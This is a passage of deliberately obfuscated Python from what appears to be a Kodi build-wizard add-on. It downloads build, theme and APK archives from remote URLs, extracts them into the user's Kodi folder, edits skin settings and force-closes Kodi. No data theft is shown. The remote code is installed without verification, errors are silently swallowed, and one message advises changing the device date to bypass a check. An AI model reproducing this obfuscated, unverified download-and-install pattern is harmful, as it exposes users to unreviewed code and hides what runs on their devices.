			O0O0O000000OOOO0O =OOOO0OO0OO00OO000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3778
			if not wiz .workingURL (O0O000OOOOO0O00O0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3779
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3780
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0OO0OO00OO000 ,wiz .checkBuild (OOOO0OO0OO00OO000 ,'version')),'','אנא המתן')#line:3781
			OO0O000OO0OOO00OO =os .path .join (PACKAGES ,'%s.zip'%O0O0O000000OOOO0O )#line:3782
			try :os .remove (OO0O000OO0OOO00OO )#line:3783
			except :pass #line:3784
			logging .warning (O0O000OOOOO0O00O0 )#line:3785
			if 'google'in O0O000OOOOO0O00O0 :#line:3786
			   O00O000OOOOOOOO00 =googledrive_download (O0O000OOOOO0O00O0 ,OO0O000OO0OOO00OO ,DP ,wiz .checkBuild (OOOO0OO0OO00OO000 ,'filesize'))#line:3787
			else :#line:3790
			  downloader .download (O0O000OOOOO0O00O0 ,OO0O000OO0OOO00OO ,DP )#line:3791
			xbmc .sleep (1000 )#line:3792
			O00O00O00OOOO00OO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0OO0OO00OO000 ,wiz .checkBuild (OOOO0OO0OO00OO000 ,'version'))#line:3793
			DP .update (0 ,O00O00O00OOOO00OO ,'','Please Wait')#line:3794
			OO00OOOOO0OOOOO0O ,O0OOO0O00OOOO0O0O ,O0O0000O0O000OO0O =extract .all (OO0O000OO0OOO00OO ,HOME ,DP ,title =O00O00O00OOOO00OO )#line:3795
			if int (float (OO00OOOOO0OOOOO0O ))>0 :#line:3796
				wiz .fixmetas ()#line:3797
				wiz .lookandFeelData ('save')#line:3798
				wiz .defaultSkin ()#line:3799
				wiz .setS ('buildname',OOOO0OO0OO00OO000 )#line:3801
				wiz .setS ('buildversion',wiz .checkBuild (OOOO0OO0OO00OO000 ,'version'))#line:3802
				wiz .setS ('buildtheme','')#line:3803
				wiz .setS ('latestversion',wiz .checkBuild (OOOO0OO0OO00OO000 ,'version'))#line:3804
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:3805
				wiz .setS ('installed','true')#line:3806
				wiz .setS ('extract',str (OO00OOOOO0OOOOO0O ))#line:3807
				wiz .setS ('errors',str (O0OOO0O00OOOO0O0O ))#line:3808
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OO00OOOOO0OOOOO0O ,O0OOO0O00OOOO0O0O ))#line:3809
				OO0OOOO0O000OOO00 =(ADDON .getSetting ("gaiaseren"))#line:3811
				if OO0OOOO0O000OOO00 =='true':#line:3812
					wiz .kodi17Fix ()#line:3813
				fastupdatefirstbuild (NOTEID )#line:3814
				skin_homeselect ()#line:3815
				skin_lower ()#line:3816
				rdbuildinstall ()#line:3817
				try :gaiaserenaddon ()#line:3819
				except :pass #line:3820
				adults18 ()#line:3821
				skinfix18 ()#line:3822
				try :os .remove (OO0O000OO0OOO00OO )#line:3824
				except :pass #line:3825
				if OO0OOOO0O000OOO00 =='true':#line:3827
					wiz .kodi17Fix ()#line:3828
				if int (float (O0OOO0O00OOOO0O0O ))>0 :#line:3830
					O0OOOO0000O00OO00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0OO0OO00OO000 ,wiz .checkBuild (OOOO0OO0OO00OO000 ,'version')),'הושלם: [COLOR %s]%s%s[/COLOR] [שגיאות:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OO00OOOOO0OOOOO0O ,'%',COLOR1 ,O0OOO0O00OOOO0O0O ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:3831
					if O0OOOO0000O00OO00 :#line:3832
						if isinstance (O0OOO0O00OOOO0O0O ,unicode ):#line:3833
							O0O0000O0O000OO0O =O0O0000O0O000OO0O .encode ('utf-8')#line:3834
						wiz .TextBox (ADDONTITLE ,O0O0000O0O000OO0O )#line:3835
				DP .close ()#line:3836
				OO0O00000O00OOO00 =wiz .themeCount (OOOO0OO0OO00OO000 )#line:3837
				indicator ()#line:3838
				if not OO0O00000O00OOO00 ==False :#line:3839
					buildWizard (OOOO0OO0OO00OO000 ,'theme')#line:3840
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:3841
				if INSTALLMETHOD ==1 :OOO0OO00O0000OO00 =1 #line:3842
				elif INSTALLMETHOD ==2 :OOO0OO00O0000OO00 =0 #line:3843
				else :resetkodi ()#line:3844
				if OOO0OO00O0000OO00 ==1 :wiz .reloadFix ()#line:3846
				else :wiz .killxbmc (True )#line:3847
			else :#line:3848
				if isinstance (O0OOO0O00OOOO0O0O ,unicode ):#line:3849
					O0O0000O0O000OO0O =O0O0000O0O000OO0O .encode ('utf-8')#line:3850
				O0OOO0OO00O000O0O =open (OO0O000OO0OOO00OO ,'r')#line:3851
				O0OO0O0O0OO0OOO0O =O0OOO0OO00O000O0O .read ()#line:3852
				OOOO0OO0000O0O000 =''#line:3853
				for O00000OO000O0OOOO in O00O000OOOOOOOO00 :#line:3854
				  OOOO0OO0000O0O000 ='key: '+OOOO0OO0000O0O000 +'\n'+O00000OO000O0OOOO #line:3855
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,O0O0000O0O000OO0O +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+OOOO0OO0000O0O000 )#line:3856
		else :#line:3857
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:3858
	elif OOOOOO0O0OOOOOOO0 =='theme':#line:3859
		if theme ==None :#line:3860
			OO0O00000O00OOO00 =wiz .checkBuild (OOOO0OO0OO00OO000 ,'theme')#line:3861
			O0000O0OOO0OO0O0O =[]#line:3862
			if not OO0O00000O00OOO00 =='http://'and wiz .workingURL (OO0O00000O00OOO00 )==True :#line:3863
				O0000O0OOO0OO0O0O =wiz .themeCount (OOOO0OO0OO00OO000 ,False )#line:3864
				if len (O0000O0OOO0OO0O0O )>0 :#line:3865
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,OOOO0OO0OO00OO000 ,COLOR1 ,len (O0000O0OOO0OO0O0O )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:3866
						wiz .log ("Theme List: %s "%str (O0000O0OOO0OO0O0O ))#line:3867
						OO0O000O0O000OO0O =DIALOG .select (ADDONTITLE ,O0000O0OOO0OO0O0O )#line:3868
						wiz .log ("Theme install selected: %s"%OO0O000O0O000OO0O )#line:3869
						if not OO0O000O0O000OO0O ==-1 :theme =O0000O0OOO0OO0O0O [OO0O000O0O000OO0O ];OO0OO00OOOO00OO0O =True #line:3870
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:3871
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:3872
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:3873
		else :OO0OO00OOOO00OO0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,OOOO0OO0OO00OO000 ,wiz .checkBuild (OOOO0OO0OO00OO000 ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:3874
		if OO0OO00OOOO00OO0O :#line:3875
			OO0O0O0O00OO0OO00 =wiz .checkTheme (OOOO0OO0OO00OO000 ,theme ,'url')#line:3876
			O0O0O000000OOOO0O =OOOO0OO0OO00OO000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3877
			if not wiz .workingURL (OO0O0O0O00OO0OO00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:3878
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3879
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:3880
			OO0O000OO0OOO00OO =os .path .join (PACKAGES ,'%s.zip'%O0O0O000000OOOO0O )#line:3881
			try :os .remove (OO0O000OO0OOO00OO )#line:3882
			except :pass #line:3883
			downloader .download (OO0O0O0O00OO0OO00 ,OO0O000OO0OOO00OO ,DP )#line:3884
			xbmc .sleep (1000 )#line:3885
			DP .update (0 ,"","Installing %s "%OOOO0OO0OO00OO000 )#line:3886
			OOO0O00OOOOO00OO0 =False #line:3887
			if url not in ["fresh","normal"]:#line:3888
				OOO0O00OOOOO00OO0 =testTheme (OO0O000OO0OOO00OO )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:3889
				O0O00O0OOO0O0000O =testGui (OO0O000OO0OOO00OO )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:3890
				if OOO0O00OOOOO00OO0 ==True :#line:3891
					wiz .lookandFeelData ('save')#line:3892
					OO0OO0O00OO000000 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:3893
					OO00O00OOO00000O0 =xbmc .getSkinDir ()#line:3894
					skinSwitch .swapSkins (OO0OO0O00OO000000 )#line:3896
					OOOOO0OO0OO0OOO0O =0 #line:3897
					xbmc .sleep (1000 )#line:3898
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOOO0OO0OO0OOO0O <150 :#line:3899
						OOOOO0OO0OO0OOO0O +=1 #line:3900
						xbmc .sleep (1000 )#line:3901
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3902
						wiz .ebi ('SendClick(11)')#line:3903
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:3904
					xbmc .sleep (1000 )#line:3905
			O00O00O00OOOO00OO ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:3906
			DP .update (0 ,O00O00O00OOOO00OO ,'','אנא המתן')#line:3907
			OO00OOOOO0OOOOO0O ,O0OOO0O00OOOO0O0O ,O0O0000O0O000OO0O =extract .all (OO0O000OO0OOO00OO ,HOME ,DP ,title =O00O00O00OOOO00OO )#line:3908
			wiz .setS ('buildtheme',theme )#line:3909
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(OO00OOOOO0OOOOO0O ,O0OOO0O00OOOO0O0O ))#line:3910
			DP .close ()#line:3911
			if url not in ["fresh","normal"]:#line:3912
				wiz .forceUpdate ()#line:3913
				if KODIV >=17 :wiz .kodi17Fix ()#line:3914
				if O0O00O0OOO0O0000O ==True :#line:3915
					wiz .lookandFeelData ('save')#line:3916
					wiz .defaultSkin ()#line:3917
					OO00O00OOO00000O0 =wiz .getS ('defaultskin')#line:3918
					skinSwitch .swapSkins (OO00O00OOO00000O0 )#line:3919
					OOOOO0OO0OO0OOO0O =0 #line:3920
					xbmc .sleep (1000 )#line:3921
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOOO0OO0OO0OOO0O <150 :#line:3922
						OOOOO0OO0OO0OOO0O +=1 #line:3923
						xbmc .sleep (1000 )#line:3924
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3926
						wiz .ebi ('SendClick(11)')#line:3927
					wiz .lookandFeelData ('restore')#line:3928
				elif OOO0O00OOOOO00OO0 ==True :#line:3929
					skinSwitch .swapSkins (OO00O00OOO00000O0 )#line:3930
					OOOOO0OO0OO0OOO0O =0 #line:3931
					xbmc .sleep (1000 )#line:3932
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOOO0OO0OO0OOO0O <150 :#line:3933
						OOOOO0OO0OO0OOO0O +=1 #line:3934
						xbmc .sleep (1000 )#line:3935
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3937
						wiz .ebi ('SendClick(11)')#line:3938
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:3939
					wiz .lookandFeelData ('restore')#line:3940
				else :#line:3941
					wiz .ebi ("ReloadSkin()")#line:3942
					xbmc .sleep (1000 )#line:3943
					wiz .ebi ("Container.Refresh")#line:3944
		else :#line:3945
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:3946
def skin_homeselect ():#line:3950
	try :#line:3952
		O0O0O00O0O00OO00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3953
		OO0OO0OO00OO0OO0O =open (O0O0O00O0O00OO00O ,'r')#line:3955
		OOO0OOO0O0OO000O0 =OO0OO0OO00OO0OO0O .read ()#line:3956
		OO0OO0OO00OO0OO0O .close ()#line:3957
		OOO0OOO00O00OOOO0 ='<setting id="HomeS" type="string(.+?)/setting>'#line:3958
		O00O00OO0O000O00O =re .compile (OOO0OOO00O00OOOO0 ).findall (OOO0OOO0O0OO000O0 )[0 ]#line:3959
		OO0OO0OO00OO0OO0O =open (O0O0O00O0O00OO00O ,'w')#line:3960
		OO0OO0OO00OO0OO0O .write (OOO0OOO0O0OO000O0 .replace ('<setting id="HomeS" type="string%s/setting>'%O00O00OO0O000O00O ,'<setting id="HomeS" type="string"></setting>'))#line:3961
		OO0OO0OO00OO0OO0O .close ()#line:3962
	except :#line:3963
		pass #line:3964
def skin_lower ():#line:3967
	O000O0O000O0OO0OO =(ADDON .getSetting ("lower"))#line:3968
	if O000O0O000O0OO0OO =='true':#line:3969
		try :#line:3972
			O0O0000O00O0000OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3973
			O00O0O0000OOOO000 =open (O0O0000O00O0000OO ,'r')#line:3975
			OOO00O000O00000OO =O00O0O0000OOOO000 .read ()#line:3976
			O00O0O0000OOOO000 .close ()#line:3977
			OOO00OO000000000O ='<setting id="none_widget" type="bool(.+?)/setting>'#line:3978
			O00OOO000OO0OO0OO =re .compile (OOO00OO000000000O ).findall (OOO00O000O00000OO )[0 ]#line:3979
			O00O0O0000OOOO000 =open (O0O0000O00O0000OO ,'w')#line:3980
			O00O0O0000OOOO000 .write (OOO00O000O00000OO .replace ('<setting id="none_widget" type="bool%s/setting>'%O00OOO000OO0OO0OO ,'<setting id="none_widget" type="bool">true</setting>'))#line:3981
			O00O0O0000OOOO000 .close ()#line:3982
			O0O0000O00O0000OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3984
			O00O0O0000OOOO000 =open (O0O0000O00O0000OO ,'r')#line:3986
			OOO00O000O00000OO =O00O0O0000OOOO000 .read ()#line:3987
			O00O0O0000OOOO000 .close ()#line:3988
			OOO00OO000000000O ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:3989
			O00OOO000OO0OO0OO =re .compile (OOO00OO000000000O ).findall (OOO00O000O00000OO )[0 ]#line:3990
			O00O0O0000OOOO000 =open (O0O0000O00O0000OO ,'w')#line:3991
			O00O0O0000OOOO000 .write (OOO00O000O00000OO .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%O00OOO000OO0OO0OO ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:3992
			O00O0O0000OOOO000 .close ()#line:3993
			O0O0000O00O0000OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3995
			O00O0O0000OOOO000 =open (O0O0000O00O0000OO ,'r')#line:3997
			OOO00O000O00000OO =O00O0O0000OOOO000 .read ()#line:3998
			O00O0O0000OOOO000 .close ()#line:3999
			OOO00OO000000000O ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4000
			O00OOO000OO0OO0OO =re .compile (OOO00OO000000000O ).findall (OOO00O000O00000OO )[0 ]#line:4001
			O00O0O0000OOOO000 =open (O0O0000O00O0000OO ,'w')#line:4002
			O00O0O0000OOOO000 .write (OOO00O000O00000OO .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%O00OOO000OO0OO0OO ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4003
			O00O0O0000OOOO000 .close ()#line:4004
			O0O0000O00O0000OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4008
			O00O0O0000OOOO000 =open (O0O0000O00O0000OO ,'r')#line:4010
			OOO00O000O00000OO =O00O0O0000OOOO000 .read ()#line:4011
			O00O0O0000OOOO000 .close ()#line:4012
			OOO00OO000000000O ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4013
			O00OOO000OO0OO0OO =re .compile (OOO00OO000000000O ).findall (OOO00O000O00000OO )[0 ]#line:4014
			O00O0O0000OOOO000 =open (O0O0000O00O0000OO ,'w')#line:4015
			O00O0O0000OOOO000 .write (OOO00O000O00000OO .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%O00OOO000OO0OO0OO ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4016
			O00O0O0000OOOO000 .close ()#line:4017
			O0O0000O00O0000OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4021
			O00O0O0000OOOO000 =open (O0O0000O00O0000OO ,'r')#line:4023
			OOO00O000O00000OO =O00O0O0000OOOO000 .read ()#line:4024
			O00O0O0000OOOO000 .close ()#line:4025
			OOO00OO000000000O ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4026
			O00OOO000OO0OO0OO =re .compile (OOO00OO000000000O ).findall (OOO00O000O00000OO )[0 ]#line:4027
			O00O0O0000OOOO000 =open (O0O0000O00O0000OO ,'w')#line:4028
			O00O0O0000OOOO000 .write (OOO00O000O00000OO .replace ('<setting id="show.cdart" type="bool%s/setting>'%O00OOO000OO0OO0OO ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4029
			O00O0O0000OOOO000 .close ()#line:4030
			O0O0000O00O0000OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4034
			O00O0O0000OOOO000 =open (O0O0000O00O0000OO ,'r')#line:4036
			OOO00O000O00000OO =O00O0O0000OOOO000 .read ()#line:4037
			O00O0O0000OOOO000 .close ()#line:4038
			OOO00OO000000000O ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4039
			O00OOO000OO0OO0OO =re .compile (OOO00OO000000000O ).findall (OOO00O000O00000OO )[0 ]#line:4040
			O00O0O0000OOOO000 =open (O0O0000O00O0000OO ,'w')#line:4041
			O00O0O0000OOOO000 .write (OOO00O000O00000OO .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%O00OOO000OO0OO0OO ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4042
			O00O0O0000OOOO000 .close ()#line:4043
		except :#line:4048
			pass #line:4049
def thirdPartyInstall (O00O000OO00OO0OO0 ,OO000OOOOO00OOOO0 ):#line:4051
	if not wiz .workingURL (OO000OOOOO00OOOO0 ):#line:4052
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4053
	OOO00O0O00O0O000O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00O000OO00OO0OO0 ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4054
	if OOO00O0O00O0O000O ==1 :#line:4055
		freshStart ('third',True )#line:4056
	wiz .clearS ('build')#line:4057
	O00O00O0O0OO0OO0O =O00O000OO00OO0OO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4058
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4059
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O000OO00OO0OO0 ),'','אנא המתן')#line:4060
	O0O0OOOO0OOO0OOO0 =os .path .join (PACKAGES ,'%s.zip'%O00O00O0O0OO0OO0O )#line:4061
	try :os .remove (O0O0OOOO0OOO0OOO0 )#line:4062
	except :pass #line:4063
	downloader .download (OO000OOOOO00OOOO0 ,O0O0OOOO0OOO0OOO0 ,DP )#line:4064
	xbmc .sleep (1000 )#line:4065
	OOOOOOOOO0O0O000O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O000OO00OO0OO0 )#line:4066
	DP .update (0 ,OOOOOOOOO0O0O000O ,'','אנא המתן')#line:4067
	O000OO00OOOO0OO00 ,OOOO0000OOOO00O0O ,O0OOO0OOOO0OOOO0O =extract .all (O0O0OOOO0OOO0OOO0 ,HOME ,DP ,title =OOOOOOOOO0O0O000O )#line:4068
	if int (float (O000OO00OOOO0OO00 ))>0 :#line:4069
		wiz .fixmetas ()#line:4070
		wiz .lookandFeelData ('save')#line:4071
		wiz .defaultSkin ()#line:4072
		wiz .setS ('installed','true')#line:4074
		wiz .setS ('extract',str (O000OO00OOOO0OO00 ))#line:4075
		wiz .setS ('errors',str (OOOO0000OOOO00O0O ))#line:4076
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O000OO00OOOO0OO00 ,OOOO0000OOOO00O0O ))#line:4077
		try :os .remove (O0O0OOOO0OOO0OOO0 )#line:4078
		except :pass #line:4079
		if int (float (OOOO0000OOOO00O0O ))>0 :#line:4080
			O000000000OO0O0O0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O000OO00OO0OO0 ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O000OO00OOOO0OO00 ,'%',COLOR1 ,OOOO0000OOOO00O0O ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4081
			if O000000000OO0O0O0 :#line:4082
				if isinstance (OOOO0000OOOO00O0O ,unicode ):#line:4083
					O0OOO0OOOO0OOOO0O =O0OOO0OOOO0OOOO0O .encode ('utf-8')#line:4084
				wiz .TextBox (ADDONTITLE ,O0OOO0OOOO0OOOO0O )#line:4085
	DP .close ()#line:4086
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4087
	if INSTALLMETHOD ==1 :O0OO000000O0O0OO0 =1 #line:4088
	elif INSTALLMETHOD ==2 :O0OO000000O0O0OO0 =0 #line:4089
	else :O0OO000000O0O0OO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4090
	if O0OO000000O0O0OO0 ==1 :wiz .reloadFix ()#line:4091
	else :wiz .killxbmc (True )#line:4092
def testTheme (O0O0OO0OO000000O0 ):#line:4094
	OO00000O00OO0OO0O =zipfile .ZipFile (O0O0OO0OO000000O0 )#line:4095
	for O0OO0O0O0O0O0O00O in OO00000O00OO0OO0O .infolist ():#line:4096
		if '/settings.xml'in O0OO0O0O0O0O0O00O .filename :#line:4097
			return True #line:4098
	return False #line:4099
def testGui (OOOOOOO00OO00OOOO ):#line:4101
	OO000O00O0OO00OO0 =zipfile .ZipFile (OOOOOOO00OO00OOOO )#line:4102
	for OOOOOO000000O0O0O in OO000O00O0OO00OO0 .infolist ():#line:4103
		if '/guisettings.xml'in OOOOOO000000O0O0O .filename :#line:4104
			return True #line:4105
	return False #line:4106
def apkInstaller (O0O0O00O00OO00O00 ,OO0O00O0OOO000000 ):#line:4108
	wiz .log (O0O0O00O00OO00O00 )#line:4109
	wiz .log (OO0O00O0OOO000000 )#line:4110
	if wiz .platform ()=='android':#line:4111
		O0O0O00OOOOOOOOO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0O00O00OO00O00 ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4112
		if not O0O0O00OOOOOOOOO0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4113
		O00OOOOO00OO0OO0O =O0O0O00O00OO00O00 #line:4114
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4115
		if not wiz .workingURL (OO0O00O0OOO000000 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4116
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OOOOO00OO0OO0O ),'','אנא המתן')#line:4117
		O0000O0000O0O0000 =os .path .join (PACKAGES ,"%s.apk"%O0O0O00O00OO00O00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4118
		try :os .remove (O0000O0000O0O0000 )#line:4119
		except :pass #line:4120
		downloader .download (OO0O00O0OOO000000 ,O0000O0000O0O0000 ,DP )#line:4121
		xbmc .sleep (100 )#line:4122
		DP .close ()#line:4123
		notify .apkInstaller (O0O0O00O00OO00O00 )#line:4124
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+O0000O0000O0O0000 +'")')#line:4125
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4126
def createMenu (OO000O00000OO0O00 ,OOOO00O0000OOO000 ,O00000OOOOO0OO0O0 ):#line:4132
	if OO000O00000OO0O00 =='saveaddon':#line:4133
		OO00O000O0OO0O000 =[]#line:4134
		OO0000OO0O0OOO0O0 =urllib .quote_plus (OOOO00O0000OOO000 .lower ().replace (' ',''))#line:4135
		O0O00O00OO0OOO0O0 =OOOO00O0000OOO000 .replace ('Debrid','Real Debrid')#line:4136
		O00OO00OOO0OOOOO0 =urllib .quote_plus (O00000OOOOO0OO0O0 .lower ().replace (' ',''))#line:4137
		O00000OOOOO0OO0O0 =O00000OOOOO0OO0O0 .replace ('url','URL Resolver')#line:4138
		OO00O000O0OO0O000 .append ((THEME2 %O00000OOOOO0OO0O0 .title (),' '))#line:4139
		OO00O000O0OO0O000 .append ((THEME3 %'Save %s Data'%O0O00O00OO0OOO0O0 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OO0000OO0O0OOO0O0 ,O00OO00OOO0OOOOO0 )))#line:4140
